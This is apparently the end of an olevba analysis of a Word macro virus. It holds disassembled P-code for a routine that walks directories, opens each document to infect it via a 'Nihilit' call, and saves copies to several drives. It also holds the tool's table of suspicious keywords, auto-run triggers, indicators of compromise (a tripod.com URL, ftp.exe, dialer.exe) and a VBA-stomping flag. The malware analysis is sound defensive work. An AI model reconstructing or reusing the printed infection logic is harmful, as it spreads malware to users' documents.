' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #372:
' 	Reparse 0x006A "If (fName &lt;&gt; "") And ((fName &lt;&gt; ".") And (fName &lt;&gt; "..")) Then InfectDoc = pName & fName"
' Line #373:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed Filename 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #374:
' 	ArgsCall (Call) Nihilit 0x0000 
' Line #375:
' 	Reparse 0x001C "Do While (fName &lt;&gt; "")"
' Line #376:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #377:
' 	LineCont 0x0004 00 00 E6 FF
' 	Reparse 0x004F "If (fName &lt;&gt; "") And((fName &lt;&gt; ".") And (fName &lt;&gt; "..")) Then"
' Line #378:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #379:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed Filename 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #380:
' 	ArgsCall (Call) Nihilit 0x0000 
' Line #381:
' 	EndIfBlock 
' Line #382:
' 	Loop 
' Line #383:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #384:
' 	LitStr 0x0002 "p:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #385:
' 	Ld svt$ 
' 	ParamNamed Filename 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #386:
' 	LitStr 0x0002 "r:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #387:
' 	Ld svt$ 
' 	ParamNamed Filename 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #388:
' 	LitStr 0x0002 "s:"
' 	ArgsCall ChangeFileOpenDirectory 0x0001 
' Line #389:
' 	Ld svt$ 
' 	ParamNamed Filename 
' 	LitVarSpecial (False)
' 	ParamNamed LockComments 
' 	LitStr 0x002A ", AddToRecentFiles:=False, WritePassword:="
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #390:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://members.tripo|URL                                          |
|          |d.com/Nihilit/      |                                             |
|IOC       |winzip32.exe        |Executable file name                         |
|IOC       |ftp.exe             |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |dialer.exe          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

